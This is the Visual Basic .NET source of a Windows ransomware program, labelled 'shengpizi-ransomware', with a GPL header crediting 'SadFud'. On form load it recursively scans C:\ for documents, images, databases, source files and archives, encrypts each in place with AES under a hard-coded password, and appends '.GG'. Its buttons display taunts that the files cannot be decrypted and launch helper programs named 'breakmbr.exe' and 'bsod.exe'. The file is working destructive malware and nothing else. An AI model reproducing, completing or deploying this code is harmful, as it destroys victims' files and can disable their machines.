'Coded by SadFud - 2016
'@Sadfud
'https://reversecodes.wordpress.com
'licensed under GNU-gpl v3

Imports System.IO
Imports System.Security.Cryptography
Imports System.Text

Public Class Form1
    'Private Sub Play_Music(ByVal Mname As String)
    'Dim res As IO.Stream = Reflection.Assembly.GetEntryAssembly.GetManifestResourceStream("shengpizi-ransomware" & Mname)
    ' Dim bytes(res.Length - 1) As Byte
    '     res.Read(bytes, 0, bytes.Length)
    '    My.Computer.Audio.Play(bytes, AudioPlayMode.BackgroundLoop)
    ' End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim a As New Media.SoundPlayer
        a.SoundLocation = Application.StartupPath + "\bgm.wav"
        a.PlayLooping()
        Call Empezar()
    End Sub
    Public Shared Function BusarArchivos(ruta As String, mExtesiones As IEnumerable(Of String)) As IEnumerable(Of String)
        Return (From mArchivos In IO.Directory.GetFiles(ruta, "*", IO.SearchOption.AllDirectories) Where mExtesiones.Contains(IO.Path.GetExtension(mArchivos).ToLower())).ToList()
    End Function
    'rutina modificada a partir de una de Apex95
    Public Shared Sub RutinaDeCifrado(nombre As String, password As String)
        Dim key As Byte() = New Byte(31) {}
        Encoding.Default.GetBytes(password).CopyTo(key, 0)
        Dim aes As New RijndaelManaged() With
            {
                .Mode = CipherMode.CBC,
                .KeySize = 256,
                .BlockSize = 256,
                .Padding = PaddingMode.Zeros
            }
        Dim buffer As Byte() = File.ReadAllBytes(nombre)
        Using matrizStream As New MemoryStream
            Using cStream As New CryptoStream(matrizStream, aes.CreateEncryptor(key, key), CryptoStreamMode.Write)
                cStream.Write(buffer, 0, buffer.Length)
                Dim appendBuffer As Byte() = matrizStream.ToArray()
                Dim finalBuffer As Byte() = New Byte(appendBuffer.Length - 1) {}
                appendBuffer.CopyTo(finalBuffer, 0)
                File.WriteAllBytes(nombre, finalBuffer)

            End Using
        End Using
        File.Move(nombre, nombre & ".GG")
    End Sub
    Private Sub Empezar()
        Dim mExtesiones As IEnumerable(Of String) = {".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw", ".cs", ".csv", ".db", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"}
        Dim ruta As String = "C:\"
        For Each mArchivos As String In BusarArchivos(ruta, mExtesiones)
            RutinaDeCifrado(mArchivos, "SadFud@Indetectables(dot)net")
        Next
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        MsgBox("我仅仅是个按钮", 16, "emmm")
        MsgBox("点我干嘛", 16, "emmm")
        MsgBox("口亨", 16, "emmm")
        MsgBox("自己想办法去", 16, "emmm")
    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        MsgBox("已加密的文件无法解密", 16, "emmm")
        MsgBox("谁让你知识短浅", 16, "emmm")
        MsgBox("口亨", 16, "emmm")
        MsgBox("不和你多说了，再见！！！", 16, "emmm")
        End
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Process.Start(Application.StartupPath + "\breakmbr.exe")
        Process.Start(Application.StartupPath + "\bsod.exe")
    End Sub
End Class
